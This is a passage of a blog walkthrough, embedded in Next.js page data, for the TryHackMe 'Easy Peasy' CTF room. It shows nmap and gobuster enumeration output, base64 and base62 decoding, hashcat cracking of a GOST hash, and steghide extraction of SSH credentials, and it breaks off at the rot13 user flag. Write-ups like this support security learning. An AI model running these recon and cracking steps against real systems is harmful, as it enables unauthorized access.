Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]}]]}]}]]}]\n"])</script><script>self.__next_f.push([1,"3:[[[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}],[\"$\",\"title\",null,{\"children\":\"/dev/blog - /dev/blog - TryHackMe - Easy Peasy\"}],[\"$\",\"meta\",null,{\"name\":\"description\",\"content\":\"Writeup for the TryHackMe room Easy Peasy, a CTF like vulnerable machine.\"}],[\"$\",\"meta\",null,{\"name\":\"application-name\",\"content\":\"/dev/blog\"}],null,null,[\"$\",\"meta\",null,{\"name\":\"generator\",\"content\":\"Next.js\"}],[\"$\",\"meta\",null,{\"name\":\"keywords\",\"content\":\"Dev,Blog,Programmings\"}],[\"$\",\"meta\",null,{\"name\":\"referrer\",\"content\":\"origin-when-cross-origin\"}],[[\"$\",\"meta\",null,{\"name\":\"theme-color\",\"content\":\"amber\"}]],[\"$\",\"meta\",null,{\"name\":\"color-scheme\",\"content\":\"dark\"}],[\"$\",\"meta\",null,{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",null,{\"name\":\"creator\",\"content\":\"Joshua Chapman\"}],null,null,null,null,null,null,null,null,null,[]],[[\"$\",\"link\",null,{\"rel\":\"canonical\",\"href\":\"https://joshuachp.dev/posts/2020-08-06_tryhackme_easy_peasy\"}],null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.svg\",\"type\":\"image/svg+xml\"}],[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.png\",\"type\":\"image/png\"}],[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\"}]],[],null]]\n"])</script><script>self.__next_f.push([1,"e:I{\"id\":\"3619\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"991:app/posts/page-e472f6bcb7e02e60\"],\"async\":false}\nf:I{\"id\":\"7876\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"563:app/posts/[path]/page-36232329709e656d\"],\"async\":false}\n"])</script><script>self.__next_f.push([1,"d:[\"$\",\"article\",null,{\"className\":\"flex max-w-full grow flex-col justify-self-start\",\"children\":[[\"$\",\"h1\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl\",\"children\":[[\"$\",\"span\",\"1\",{\"children\":\"TryHackMe - Easy Peasy\"}]]}],[\"$\",\"blockquote\",\"11\",{\"children\":[[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"5\",{\"children\":\"The room link can be found at\"}],\"\\r\\n\",[\"$\",\"$Le\",null,{\"title\":\"\",\"className\":\"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600\",\"href\":\"https://tryhackme.com/room/easypeasyctf\",\"children\":[[\"$\",\"span\",\"8\",{\"children\":\"TryHackMe - Easy Peasy\"}]]}]]}]]}],[\"$\",\"h2\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl\",\"children\":[[\"$\",\"span\",\"13\",{\"children\":\"Enumeration\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"16\",{\"children\":\"First we scan for open ports and services\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"19\",{\"children\":\"Nmap\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"22\",{\"children\":\"We use nmap with some default arguments.\"}]]}],[\"$\",\"$Lf\",\"26\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"25\",{\"children\":\"sudo nmap -sV -sC -oA nmap/first $IP\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"28\",{\"children\":\"It will return.\"}]]}],[\"$\",\"$Lf\",\"32\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"31\",{\"children\":\"PORT   STATE SERVICE VERSION\\n80/tcp open  http    nginx 1.16.1\\n| http-robots.txt: 1 disallowed entry\\n|_/\\n|_http-server-header: nginx/1.16.1\\n|_http-title: Welcome to nginx!\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"34\",{\"children\":\"From the first scan we can see that port \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"80\"}],[\"$\",\"span\",\"36\",{\"children\":\" is open with \"}],[\"$\",\"strong\",\"39\",{\"children\":[[\"$\",\"span\",\"38\",{\"children\":\"nginx\"}]]}],[\"$\",\"span\",\"40\",{\"children\":\" version\"}],\"\\r\\n\",[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"1.16.1\"}]]}],[\"$\",\"h4\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-xl font-semibold tracking-tight sm:text-2xl md:text-3xl\",\"children\":[[\"$\",\"span\",\"45\",{\"children\":\"All ports\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"48\",{\"children\":\"So let\"}],[\"$\",\"span\",\"49\",{\"children\":\"’\"}],[\"$\",\"span\",\"50\",{\"children\":\"s retry for all ports \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"-p-\"}],[\"$\",\"span\",\"52\",{\"children\":\" in the background, using \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"-v\"}],[\"$\",\"span\",\"54\",{\"children\":\" to increase\"}],\"\\r\\n\",[\"$\",\"span\",\"56\",{\"children\":\"the verbosity and removing the scripts \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"-sC\"}],[\"$\",\"span\",\"58\",{\"children\":\" and version \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"-sV\"}],[\"$\",\"span\",\"60\",{\"children\":\" parameters.\"}]]}],[\"$\",\"$Lf\",\"64\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"63\",{\"children\":\"sudo nmap -v -p- -oA nmap/all $IP\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"66\",{\"children\":\"This returns three ports open\"}]]}],[\"$\",\"$Lf\",\"70\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"69\",{\"children\":\"PORT      STATE SERVICE\\n80/tcp    open  http\\n6498/tcp  open  unknown\\n65524/tcp open  unknown\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"72\",{\"children\":\"Let\"}],[\"$\",\"span\",\"73\",{\"children\":\"’\"}],[\"$\",\"span\",\"74\",{\"children\":\"s try to gather more information from those ports, scanning only those\"}],\"\\r\\n\",[\"$\",\"span\",\"76\",{\"children\":\"specifically.\"}]]}],[\"$\",\"$Lf\",\"80\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"79\",{\"children\":\"sudo nmap -sC -sV -oA nmap/ports -p 80,65524,6498 $IP\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"82\",{\"children\":\"The output is the following\"}]]}],[\"$\",\"$Lf\",\"86\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"85\",{\"children\":\"PORT      STATE SERVICE VERSION\\n80/tcp    open  http    nginx 1.16.1\\n| http-robots.txt: 1 disallowed entry\\n|_/\\n|_http-server-header: nginx/1.16.1\\n|_http-title: Welcome to nginx!\\n6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)\\n|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)\\n|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)\\n65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))\\n| http-robots.txt: 1 disallowed entry\\n|_/\\n|_http-server-header: Apache/2.4.43 (Ubuntu)\\n|_http-title: Apache2 Debian Default Page: It works\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"88\",{\"children\":\"So summing up we have:\"}]]}],[\"$\",\"ol\",null,{\"start\":1,\"className\":\"mb-4 mt-2 ml-6 text-primary-900 dark:text-primary-50 text-sm sm:text-base xl:text-lg list-decimal\",\"children\":[[\"$\",\"li\",\"93\",{\"className\":\"mb-2\",\"children\":[[\"$\",\"span\",\"92\",{\"children\":\"HTTP port 80 with nginx\"}]]}],[\"$\",\"li\",\"96\",{\"className\":\"mb-2\",\"children\":[[\"$\",\"span\",\"95\",{\"children\":\"SSH port 6498 with OpenSSH\"}]]}],[\"$\",\"li\",\"99\",{\"className\":\"mb-2\",\"children\":[[\"$\",\"span\",\"98\",{\"children\":\"HTTP port 65524 with Apache\"}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"102\",{\"children\":\"Gobuster\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"105\",{\"children\":\"While scanning for other open ports let\"}],[\"$\",\"span\",\"106\",{\"children\":\"’\"}],[\"$\",\"span\",\"107\",{\"children\":\"s start \"}],[\"$\",\"strong\",\"110\",{\"children\":[[\"$\",\"span\",\"109\",{\"children\":\"gobuster\"}]]}],[\"$\",\"span\",\"111\",{\"children\":\" to enumerate\"}],\"\\r\\n\",[\"$\",\"span\",\"113\",{\"children\":\"directories on http port \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"80\"}],[\"$\",\"span\",\"115\",{\"children\":\". We will use the\"}],\"\\r\\n\",[\"$\",\"$Le\",null,{\"title\":\"\",\"className\":\"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600\",\"href\":\"https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt\",\"children\":[[\"$\",\"span\",\"118\",{\"children\":\"Seclist big\"}]]}],\"\\r\\n\",[\"$\",\"span\",\"121\",{\"children\":\"wordlist.\"}]]}],[\"$\",\"$Lf\",\"125\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"124\",{\"children\":\"gobuster dir -o gobuster/nginx -w big.txt -u http://$IP/\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"127\",{\"children\":\"Gobuster finds an \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"hidden\"}],[\"$\",\"span\",\"129\",{\"children\":\" directory.\"}]]}],[\"$\",\"$Lf\",\"133\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"132\",{\"children\":\"===============================================================\\nGobuster v3.0.1\\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\\n===============================================================\\n[+] Url:            http://$IP/\\n[+] Threads:        10\\n[+] Wordlist:       /usr/share/wordlists/dirb/big.txt\\n[+] Status codes:   200,204,301,302,307,401,403\\n[+] User Agent:     gobuster/3.0.1\\n[+] Timeout:        10s\\n===============================================================\\n2020/08/10 13:50:37 Starting gobuster\\n===============================================================\\n/hidden (Status: 301)\\n/robots.txt (Status: 200)\\n===============================================================\\n2020/08/10 13:54:18 Finished\\n===============================================================\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"135\",{\"children\":\"Let\"}],[\"$\",\"span\",\"136\",{\"children\":\"’\"}],[\"$\",\"span\",\"137\",{\"children\":\"s also scan the Apache server.\"}]]}],[\"$\",\"$Lf\",\"141\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"140\",{\"children\":\"gobuster dir -o gobuster/apache -w big.txt -u http://$IP:65524/\\n\"}]]}],[\"$\",\"$Lf\",\"144\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"143\",{\"children\":\"===============================================================\\nGobuster v3.0.1\\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\\n===============================================================\\n[+] Url:            http://$IP:65524/\\n[+] Threads:        10\\n[+] Wordlist:       /usr/share/wordlists/dirb/big.txt\\n[+] Status codes:   200,204,301,302,307,401,403\\n[+] User Agent:     gobuster/3.0.1\\n[+] Timeout:        10s\\n===============================================================\\n2020/08/10 13:54:08 Starting gobuster\\n===============================================================\\n/.htaccess (Status: 403)\\n/.htpasswd (Status: 403)\\n/robots.txt (Status: 200)\\n/server-status (Status: 403)\\n===============================================================\\n2020/08/10 13:57:18 Finished\\n===============================================================\\n\"}]]}],[\"$\",\"h2\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl\",\"children\":[[\"$\",\"span\",\"146\",{\"children\":\"Compromising\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"149\",{\"children\":\"The second fase is a bit more confusing and the directions to find the flags\"}],\"\\r\\n\",[\"$\",\"span\",\"151\",{\"children\":\"aren\"}],[\"$\",\"span\",\"152\",{\"children\":\"’\"}],[\"$\",\"span\",\"153\",{\"children\":\"t clear, but the access on the box is and privilege escalation is straight\"}],\"\\r\\n\",[\"$\",\"span\",\"155\",{\"children\":\"forward.\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"158\",{\"children\":\"Flag 1\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"161\",{\"children\":\"Futher enumerating the \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"hidden\"}],[\"$\",\"span\",\"163\",{\"children\":\" directory with gobuster we find another\"}],\"\\r\\n\",[\"$\",\"span\",\"165\",{\"children\":\"directory called \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"wathever\"}],[\"$\",\"span\",\"167\",{\"children\":\".\"}]]}],[\"$\",\"$Lf\",\"171\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"170\",{\"children\":\"gobuster dir -o gobuster/hidden -w big.txt -u http://$IP/hidden/\\n\"}]]}],[\"$\",\"$Lf\",\"174\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"173\",{\"children\":\"===============================================================\\nGobuster v3.0.1\\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\\n===============================================================\\n[+] Url:            http://$IP/hidden/\\n[+] Threads:        10\\n[+] Wordlist:       /usr/share/wordlists/dirb/big.txt\\n[+] Status codes:   200,204,301,302,307,401,403\\n[+] User Agent:     gobuster/3.0.1\\n[+] Timeout:        10s\\n===============================================================\\n2020/08/10 14:13:44 Starting gobuster\\n===============================================================\\n/whatever (Status: 301)\\n===============================================================\\n2020/08/10 14:16:48 Finished\\n===============================================================\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"176\",{\"children\":\"Viewing the source code of the page there is an hidden \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"p\"}],[\"$\",\"span\",\"178\",{\"children\":\" with a \"}],[\"$\",\"strong\",\"181\",{\"children\":[[\"$\",\"span\",\"180\",{\"children\":\"base64\"}]]}],\"\\r\\n\",[\"$\",\"span\",\"183\",{\"children\":\"encoded string.\"}]]}],[\"$\",\"$Lf\",\"187\",{\"language\":\"html\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"186\",{\"children\":\"\u003cp hidden\u003eZ____________________Q==\u003c/p\u003e\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"189\",{\"children\":\"Decoding it we can find the first flag.\"}]]}],[\"$\",\"$Lf\",\"193\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"192\",{\"children\":\"echo Z____________________Q== | base64 -d\\n\\nflag{__________}\\n\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"195\",{\"children\":\"Flag 2\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"198\",{\"children\":\"Using gobuster we have found \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"robots.txt\"}],[\"$\",\"span\",\"200\",{\"children\":\" in the Apache server which shous us\"}],\"\\r\\n\",[\"$\",\"strong\",\"204\",{\"children\":[[\"$\",\"span\",\"203\",{\"children\":\"User-Agent\"}]]}],[\"$\",\"span\",\"205\",{\"children\":\".\"}]]}],[\"$\",\"$Lf\",\"209\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"208\",{\"children\":\"User-Agent:*\\nDisallow:/\\nRobots Not Allowed\\nUser-Agent:a______________________________0\\nAllow:/\\nThis Flag Can Enter But Only This Flag No More Exceptions\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"211\",{\"children\":\"The solution wasn\"}],[\"$\",\"span\",\"212\",{\"children\":\"’\"}],[\"$\",\"span\",\"213\",{\"children\":\"t so good. You have to find the solution online in some\"}],\"\\r\\n\",[\"$\",\"span\",\"215\",{\"children\":\"obscure site searching for the hash :thinking:\"}],[\"$\",\"span\",\"216\",{\"children\":\"…\"}]]}],[\"$\",\"$Lf\",\"220\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"219\",{\"children\":\"flag{______________}\\n\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"222\",{\"children\":\"Flag 3\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"225\",{\"children\":\"On the Apache home page we can find the third flag.\"}]]}],[\"$\",\"$Lf\",\"229\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"228\",{\"children\":\"Fl4g 3 : flag{________________________________}\\n\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"231\",{\"children\":\"User Flag\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"234\",{\"children\":\"On the Apache main page in the source we can see an hidden \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"p\"}],[\"$\",\"span\",\"236\",{\"children\":\" again.\"}]]}],[\"$\",\"$Lf\",\"240\",{\"language\":\"html\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"239\",{\"children\":\"\u003cp hidden\u003eits encoded with ba....:O______________________u\u003c/p\u003e\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"242\",{\"children\":\"Since it is encoded with a base we open\"}],\"\\r\\n\",[\"$\",\"$Le\",null,{\"title\":\"\",\"className\":\"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600\",\"href\":\"https://gchq.github.io/CyberChef/\",\"children\":[[\"$\",\"span\",\"245\",{\"children\":\"Chyberchef\"}]]}],[\"$\",\"span\",\"247\",{\"children\":\" and try out a bunch of\"}],\"\\r\\n\",[\"$\",\"span\",\"249\",{\"children\":\"encodings.\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"252\",{\"children\":\"With \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"base62\"}],[\"$\",\"span\",\"254\",{\"children\":\" we can find something that looks like an hidden directory.\"}]]}],[\"$\",\"$Lf\",\"258\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"257\",{\"children\":\"/n0th1ng3ls3m4tt3r\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"260\",{\"children\":\"On this page we find a long string and an image.\"}]]}],[\"$\",\"$Lf\",\"264\",{\"language\":\"html\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"263\",{\"children\":\"\u003cp\u003e9______________________________________________________________1\u003c/p\u003e\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"266\",{\"children\":\"The hint tell us that it\"}],[\"$\",\"span\",\"267\",{\"children\":\"’\"}],[\"$\",\"span\",\"268\",{\"children\":\"s GHOST, so we use \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"hashcat\"}],[\"$\",\"span\",\"270\",{\"children\":\" and the wordlist that was\"}],\"\\r\\n\",[\"$\",\"span\",\"272\",{\"children\":\"provided to crack it.\"}]]}],[\"$\",\"$Lf\",\"276\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"275\",{\"children\":\"hashcat -a 0 -m 6900 hash.txt easypeasy.txt\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"278\",{\"children\":\"With a bit of guessing we can use \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"steghide\"}],[\"$\",\"span\",\"280\",{\"children\":\" on the image to extract some data.\"}]]}],[\"$\",\"$Lf\",\"284\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"283\",{\"children\":\"steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"286\",{\"children\":\"The output are user and password information, the password is encoded in\"}],\"\\r\\n\",[\"$\",\"span\",\"288\",{\"children\":\"binary.\"}]]}],[\"$\",\"$Lf\",\"292\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"291\",{\"children\":\"username:b____g\\npassword:\\n01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"294\",{\"children\":\"Using Cyberchef we can get the credentials.\"}]]}],[\"$\",\"$Lf\",\"298\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"297\",{\"children\":\"username: b____g\\npassword: i__________________________y\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"300\",{\"children\":\"Those are the credentials for the SSH. So when you access you can find the user\"}],\"\\r\\n\",[\"$\",\"span\",\"302\",{\"children\":\"flag.\"}]]}],[\"$\",\"$Lf\",\"306\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"305\",{\"children\":\"User Flag But It Seems Wrong Like It`s Rotated Or Something\\nsynt{a______________y}\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"308\",{\"children\":\"Which is a \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"rot13\"}],[\"$\",\"span\",\"310\",{\"children\":\" of \"}],[\"$\",\"code\",null,{\"className\":\" 